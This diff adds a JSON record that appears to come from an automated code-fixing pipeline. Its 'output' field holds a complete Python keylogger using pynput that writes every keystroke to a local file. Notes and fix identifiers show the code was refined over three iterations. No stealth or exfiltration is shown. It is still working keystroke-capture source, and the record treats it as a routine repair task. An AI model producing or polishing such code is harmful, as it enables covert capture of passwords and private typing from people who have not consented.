@@ -1,0 +1,8 @@
+{
+  "output": "import time\r\nfrom pynput.keyboard import Key, Listener\r\n\r\ndef on_press(key):\r\n    try:\r\n        key = key.char\r\n    except AttributeError:\r\n        key = str(key)\r\n    print(f'Key pressed: {key}')\r\n    with open('keylogs.txt', 'a') as file:\r\n        file.write(key + '\\n')\r\n        file.flush()\r\ndef on_release(key):\r\n    if key == Key.esc:\r\n        return False\r\n    else:\r\n        print(f'Key released: {key}')\r\n\r\nwith Listener(on_press=on_press, on_release=on_release) as listener:\r\n    listener.join()",
+  "notes": "Corrected the import statement to only include necessary components.",
+  "applied_fixes": [
+    "iteration2_issue1"
+  ],
+  "iterations": 3
+}
